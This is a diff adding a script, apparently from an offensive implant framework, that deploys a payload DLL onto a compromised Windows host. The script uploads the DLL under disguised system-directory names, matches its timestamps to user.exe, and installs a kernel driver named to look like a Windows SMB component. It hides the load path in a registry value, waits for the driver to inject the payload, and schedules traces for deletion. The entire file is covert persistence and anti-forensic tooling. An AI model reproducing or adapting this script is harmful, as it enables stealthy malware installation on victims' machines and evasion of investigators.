@@ -1,0 +1,259 @@
+
+@include "_Paths.dsi";
+@include "windows/_RegistryIncludes.dsi";
+@echo off;
+
+if ($argc < 2)
+{
+	echo("* Invalid parmeters", ERROR);
+	echo();
+	echo("Usage: $argv[0] <localFile> [driverName]");
+	return false;
+}
+
+string $localFile	= $argv[1];
+string $driverName	= "mrxsmbmg";
+if ($argc >= 2)
+{
+	$driverName = $argv[2];
+}
+
+# get the system path
+string $sysPath;
+if (!_GetSystemPath($sysPath))
+{
+	echo("* Failed to get system path", ERROR);
+	return false;
+}
+
+# get install name
+string $dllName, $dllLoadName, $dllDeleteName;
+if (!_GetRegistryValue("L",
+					   "SYSTEM\\CurrentControlSet\\Services\\$driverName\\Parameters",
+					   "Excluded",
+					   $dllName))
+{
+	# failed to get alternate name -- use default
+	$dllName		= "$sysPath\\vldpkg.dll";
+	$dllLoadName	= "$sysPath\\vldpkgx.dll";
+	$dllDeleteName	= "$sysPath\\vldpkgd.dll";
+}
+else
+{
+	$dllLoadName	= "$dllName.1";
+	$dllDeleteName	= "$dllName.2";
+}
+
+if (!GetInput("PC DLL install name", $dllName, $dllName) ||
+	!GetInput("PC DLL temporary (to load) name", $dllLoadName, $dllLoadName) ||
+	!GetInput("PC DLL temporary (to delete) name", $dllDeleteName, $dllDeleteName))
+{
+	echo("* Failed to get PC names", ERROR);
+	return false;
+}
+
+# upload the new file
+echo "Uploading new PC";
+if (!`put "$localFile" -name "$dllLoadName" -permanent`)
+{
+	echo("    FAILED", ERROR);
+	pause;
+	return false;
+}
+echo("    FINISHED", GOOD);
+
+# move the old file
+echo "Moving old PC";
+if (!`move "$dllName" "$dllDeleteName"`)
+{
+	echo("    FAILED", ERROR);
+	if (prompt("Perform cleanup?"))
+	{
+		echo "Performing recovery";
+		if (!`delete -file "$dllLoadName"`)
+		{
+			echo("    FAILED", ERROR);
+		}
+		else
+		{
+			echo("    RECOVERED", GOOD);
+		}
+	}
+	return false;
+}
+echo("    FINISHED", GOOD);
+
+# copy the new file to it's final location
+echo "Copying new PC to permanent location";
+if (!`copy "$dllLoadName" "$dllName"`)
+{
+	echo("    FAILED", ERROR);
+	if (prompt("Perform cleanup?"))
+	{
+		echo "Performing recovery";
+		if (!`move "$dllDeleteName" "$dllName"` ||
+			!`delete -file "$dllLoadName"`)
+		{
+			echo("    FAILED", ERROR);
+		}
+		else
+		{
+			echo("    RECOVERED", GOOD);
+		}
+	}
+	return false;
+}
+echo("    FINISHED", GOOD);
+
+# matchtimes on the files
+string $matchName = "user.exe";
+echo "Matching filetimes with $matchName";
+if (!`matchfiletimes -src "$sysPath\\$matchName" -dst "$dllName"` ||
+	!`matchfiletimes -src "$sysPath\\$matchName" -dst "$dllLoadName"` ||
+	!`matchfiletimes -src "$sysPath\\$matchName" -dst "$dllDeleteName"`)
+{
+	echo("    FAILED", WARNING);
+	pause;
+	# continue...
+}
+else
+{
+	echo("    FINISHED", GOOD);
+}
+
+# uninstall the current instance of UtBu
+if (!`utbu_uninstall -name $driverName -quiet`)
+{
+	PerformCleanup($dllName, $dllLoadName, $dllDeleteName);
+	return false;
+}
+
+# install a new instance
+if (!`utbu_install -name $driverName -quiet`)
+{
+	PerformCleanup($dllName, $dllLoadName, $dllDeleteName);
+	return false;
+}
+
+echo "Setting registry value with load PC location";
+`registryadd -hive L -key "SYSTEM\\CurrentControlSet\\Services\\$driverName\\Parameters"`;
+if (!_SetRegistryValue("L",
+					   "SYSTEM\\CurrentControlSet\\Services\\$driverName\\Parameters",
+					   "Excluded",
+					   $dllLoadName,
+					   "REG_SZ"))
+{
+	echo("    FAILED", ERROR);
+	if (PerformCleanup($dllName, $dllLoadName, $dllDeleteName))
+	{
+		`utbu_uninstall -name $driverName -quiet`;
+	}
+	return false;
+}
+echo("    SET", GOOD);
+
+# mark the temp files for deletion
+`delete -file "$dllLoadName" -afterreboot`;
+`delete -file "$dllDeleteName" -afterreboot`;
+
+echo "Loading driver";
+if (!`utbu_load -name $driverName -quiet`)
+{
+	echo("    FAILED", ERROR);
+	if (PerformCleanup($dllName, $dllLoadName, $dllDeleteName))
+	{
+		`utbu_uninstall -name $driverName -quiet`;
+	}
+	return false;
+}
+echo("    LOADED", GOOD);
+
+# wait for the driver to do injecting
+echo "Waiting on driver to perform injection";
+bool $injected=false;
+for (int $i=0; $i < 18; $i++)
+{
+	Sleep(10000);
+	string $status;
+	if (_GetRegistryValue("L",
+							"SYSTEM\\CurrentControlSet\\Services\\$driverName\\Parameters",
+							"Status",
+							$status) && defined($status) && (<int>$status == 1))
+	{
+		echo("    INJECTED", GOOD);
+		$injected = true;
+		break;
+	}
+}
+
+if (!$injected)
+{
+	echo("    FAILED", ERROR);
+	if (PerformCleanup($dllName, $dllLoadName, $dllDeleteName))
+	{
+		`utbu_uninstall -name $driverName -quiet`;
+	}
+	return false;
+}
+
+# injection worked -- cleanup alternate PC location key
+if ($dllName == "$sysPath\\vldpkg.dll")
+{
+	echo "Removing temporary load location value";
+	if (`registrydelete -hive L -key "SYSTEM\\CurrentControlSet\\Services\\$driverName\\Parameters" -value "Excluded"`)
+	{
+		echo("    REMOVED", GOOD);
+	}
+	else
+	{
+		echo("    FAILED (cleanup must be done by hand)", ERROR);
+		pause;
+		return false;
+	}		
+}
+else
+{
+	echo "Updating PC load location";
+	if (!_SetRegistryValue("L",
+						   "SYSTEM\\CurrentControlSet\\Services\\$driverName\\Parameters",
+						   "Excluded",
+						   $dllName,
+						   "REG_SZ"))
+	{
+		echo("    FAILED (cleanup must be done by hand)", ERROR);
+		pause;
+		return false;
+	}
+	else
+	{
+		echo("    UPDATED", GOOD);
+	}
+}
+
+return true;
+
+#---------------------------------------------------------------------------------------
+Sub PerformCleanup(IN string $dllName, IN string $dllLoadName, IN string $dllDeleteName)
+{
+
+	if (!prompt("Perform cleanup?"))
+	{
+		return false;
+	}
+	else
+	{
+		echo "Performing recovery";
+		if (!`delete -file "$dllName` ||
+			!`move "$dllDeleteName" "$dllName"` ||
+			!`delete -file "$dllLoadName"`)
+		{
+			echo("    FAILED", ERROR);
+		}
+		else
+		{
+			echo("    RECOVERED", GOOD);
+		}
+		return true;
+	}
+	
+}	/* end PerformCleanup */
